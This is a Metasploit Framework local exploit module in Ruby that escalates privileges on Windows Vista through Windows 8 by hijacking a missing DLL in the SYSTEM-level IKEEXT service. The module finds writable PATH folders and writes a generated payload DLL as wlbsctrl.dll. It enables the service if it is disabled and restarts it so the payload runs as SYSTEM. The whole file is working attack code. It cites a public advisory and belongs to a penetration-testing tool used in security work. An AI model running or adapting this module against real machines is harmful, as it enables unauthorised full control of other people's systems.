##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/post/common'
require 'msf/core/post/windows/services'

class Metasploit3 < Msf::Exploit::Local
	Rank = ExcellentRanking

	include Msf::Exploit::EXE
	include Msf::Post::Common
	include Msf::Post::File
	include Post::Windows::WindowsServices

	def initialize(info={})
		super( update_info( info,
			'Name'           => 'IKE and AuthIP IPsec Keyring Modules Missing DLL',
			'Description'    => %q{
				This module exploits a missing DLL loaded by the 'IKE and AuthIP Keyring
				Modules' service which runs as SYSTEM, and starts automatically in default
				installations of Vista-Win8.
			},
			'References'     =>
				[
					['URL', 'https://www.htbridge.com/advisory/HTB23108'],
					['URL', 'https://www.htbridge.com/vulnerability/uncontrolled-search-path-element.html']
				],
			'DisclosureDate' => "Oct 9 2012",
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Ben Campbell <eat_meatballs@hotmail.co.uk>',
				],
			'Platform'       => [ 'win'],
			'Targets'        => [ ['Windows', {}] ],
			'SessionTypes'   => [ "meterpreter" ],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
					'WfsDelay' => '5'
				},
			'DefaultTarget'  => 0,
		))

		@load_lib_search_path = [	'%SystemRoot%\\System32',
									'%SystemRoot%\\System',
									'%SystemRoot%'
								]
		@non_existant_dirs = []
	end

	def check
		service_info = service_info('IKEEXT')
		
		if service_info.nil?
			print_error("Unable to enumerate services.")
			return
		end
		
		if service_info && service_info['Name'].empty?
			print_error("Service does not exist.")
			return Exploit::CheckCode::Safe
		else
			if service_info['Startup'] == 'Disabled'
				print_error("Service is Disabled, so will be unable to exploit unless account has correct permissions...")
				return Exploit::CheckCode::Safe
			end

			if check_search_path
				return Exploit::CheckCode::Safe
			end

			return Exploit::CheckCode::Vulnerable
		end
	end

	def check_search_path
		dll = 'wlbsctrl.dll'

		@load_lib_search_path.each do |path|
			dll_path = "#{expand_path(path)}\\#{dll}"
			if file_exist?(dll_path)
				print_error("DLL already exists at #{dll_path}...")
				return true
			end
		end

		return false
	end

	def check_system_path
		print_status("Checking SYSTEM PATH folders for write access...")
		result  = registry_getvaldata('HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment', 'Path')
		paths = result.split(';')
		paths.append(@load_lib_search_path).uniq!

		paths.each do |p|
			path = expand_path(p)
			if exist?(path)
				filename = "#{path}\\#{Rex::Text.rand_text_alpha(10)}"
				vprint_status("Creating file #{filename}")
				begin
					if write_file(filename, "") and file_exist?(filename) # This will not work against UAC
						print_good("Write permissions in #{path}")
						begin
								file_rm(filename)
								vprint_status("Deleted file #{filename}")
								return path
						rescue ::Exception => e
							print_error("Error deleting #{filename} : #{e}") # Warn users if cleanup fails
						end
					end
				rescue ::Exception => e
					vprint_status("Unable to create #{filename} : #{e}")
				end
			else
				# User may be able to create the path!
				# exist? appears to have some false positives
				print_status("Path #{path} does not exist...")
				@non_existant_dirs << path
			end
		end

		return nil
	end

	# Todo, for all @non_existant_dirs can we create those
	# paths ourselves?
	def check_dirs
		return nil
	end
	
	# TODO Move to Exploit::Local?
	def session_arch
		if sysinfo["Architecture"] =~ /x64/i
			return ARCH_X64
		elsif sysinfo["Architecture"] =~ /x86/i
			return ARCH_X86
		else
			print_status("#{sysinfo["Architecture"]}")
			return nil
		end
	end

	def cleanup
		if @write_success && @dll_file_path
			begin
				file_rm(@dll_file_path)
				vprint_status("Deleted file #{@dll_file_path}")
			rescue ::Exception => e
				print_error("Error deleting #{@dll_file_path} : #{e}") # Warn users if cleanup fails
			end
		end
		
		super
	end

	def exploit
		service_name = 'IKEEXT'
		print_status("Checking service exists...")
		service_info = service_info(service_name)

		if service_info.nil?
			print_error("Unable to enumerate services.")
			return
		end
		
		if service_info && service_info['Name'].empty?
			print_error("Service does not exist.")
		end

		# DLL already exists in system folders, we dont want to overwrite by accident
		#if check_search_path
		#	return
		#end

		file_path = check_system_path
		file_path ||= check_dirs # If no paths are writable check to see if we can create any of the non-existant dirs

		if file_path.nil?
			print_error("Unable to write to any folders in the PATH, aborting...")
			return
		end

		@dll_file_path = "#{file_path}\\wlbsctrl.dll"

		if service_info['Startup'] == 'Disabled'
			print_status("Service is disabled, attempting to enable...")
			service_change_startup(service_name, 'auto')
			service_info = service_info(service_name)

			# Still disabled
			if service_info['Startup'] == 'Disabled'
				print_error("Unable to enable service, aborting...")
				return
			end
		end

		# Check architecture
		dll = generate_payload_dll({:arch => session_arch})

		#
		# Drop the malicious executable into the path
		#
		print_status("Writing #{dll.length.to_s} bytes to #{@dll_file_path}...")
		begin
			write_file(@dll_file_path, dll)
			@write_success = true
		rescue Rex::Post::Meterpreter::RequestError => e
			# Can't write the file, can't go on
			print_error(e.message)
			@write_success = false
			return
		end

		#
		# Run the service, let the Windows API do the rest
		#
		print_status("Launching service #{service_name}...")

		begin
			status = service_start(service_name)
			if status == 1
				print_status("Service already running, attempting to restart...")
				if service_stop(service_name) == 0
					print_status("Service stopped, attempting to start...")
					if service_start(service_name) == 0
						print_status("Service started...")
					else
						print_error("Unable to start service.")
					end
				else
					print_error("Unable to stop service.")
				end
			elsif status == 0
				print_status("Service started...")
			end
		rescue ::Exception => e
			if service_info['Startup'] == 'Manual'
				print_error("Unable to start service, and it does not auto start, cleaning up...")
			else
				print_status("Unable to start service, wait for a reboot...")
			end
		end
	end

end
